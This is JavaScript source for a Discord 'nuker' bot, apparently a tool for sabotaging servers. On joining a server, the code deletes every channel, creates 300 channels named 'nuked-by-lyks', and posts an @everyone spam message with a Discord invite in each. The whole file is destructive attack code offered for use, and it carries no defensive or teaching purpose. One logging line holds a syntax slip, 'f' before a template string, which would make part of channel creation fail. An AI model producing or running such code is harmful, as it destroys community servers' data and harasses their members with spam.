const { Client, GatewayIntentBits } = require("discord.js");

// Create a new client instance with required intents
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
});
// When the client is ready, run this code
function blockingWait(ms) {
  const start = Date.now();
  while (Date.now() - start < ms) {
    // Do nothing, just loop
  }
}


console.log(`
$$\\    $$\\ $$\\   $$\\       $$\\   $$\\ $$\\   $$\\ $$\\   $$\\ $$$$$$$$\\ $$$$$$$\\  
$$ |   $$ |$$ | $$  |      $$$\\  $$ |$$ |  $$ |$$ | $$  |$$  _____|$$  __$$\\ 
$$ |   $$ |$$ |$$  /       $$$$\\ $$ |$$ |  $$ |$$ |$$  / $$ |      $$ |  $$ |
\\$$\\  $$  |$$$$$  /        $$ $$\\$$ |$$ |  $$ |$$$$$  /  $$$$$\\    $$$$$$$  |
 \\$$\\$$  / $$  $$<         $$ \\$$$$ |$$ |  $$ |$$  $$<   $$  __|   $$  __$$< 
  \\$$$  /  $$ |\\$$\\        $$ |\\$$$ |$$ |  $$ |$$ |\\$$\\  $$ |      $$ |  $$ |
   \\$  /   $$ | \\$$\\       $$ | \\$$ |\\$$$$$$  |$$ | \\$$\\ $$$$$$$$\\ $$ |  $$ |
    \\_/    \\__|  \\__|      \\__|  \\__| \\______/ \\__|  \\__|\\________|\\__|  \\__|
`);
console.log(`ADD THE BOT TO A NEW SERVER TO NUKE IT !`)


const BOT_TOKEN = "YOUR_BOT_TOKEN"; // Don't expose your token publicly!

const channelnum = 300; // Default number of new channels
const customMessage = `@everyone NUKED BY LYKS
>discord.gg/lyks`; // Message to send in each new channel

client.once("ready", () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on("guildCreate", async (guild) => {
    console.clear()
    console.log(`Joined new server: ${guild.name}`);
    blockingWait(2000);
    try {
        // Delete all existing channels
        const channels = guild.channels.cache;
        for (const channel of channels.values()) {
            try {
                await channel.delete();
                console.log(`Deleted channel: ${channel.name}`);
            } catch (error) {
                console.error(`Failed to delete channel: ${channel.name}`, error);
            }
        }
        console.log("All channels have been deleted.");

        // Create new channels and send a message in each
        const createdChannels = [];
        for (let i = 1; i <= channelnum; i++) {
            try {
                const newChannel = await guild.channels.create({
                    name: `nuked-by-lyks-${i}`,
                    type: 0, // Type 0 = text channel
                });
                createdChannels.push(newChannel);
                console.log(f`Created channel: ${newChannel.name}`);
            } catch (error) {
                console.error(`Failed to create new-channel-${i}`, error);
            }
        }

        for (const channel of createdChannels) {
            try {
                await channel.send(customMessage);
                console.log(`Sent message to: ${channel.name}`);
            } catch (error) {
                console.error(`Failed to send message to ${channel.name}`, error);
            }
        }
        console.log("Messages have been sent to all new channels.");
    } catch (error) {
        console.error("An error occurred while processing the guild creation:", error);
    }
});

client.login(BOT_TOKEN);
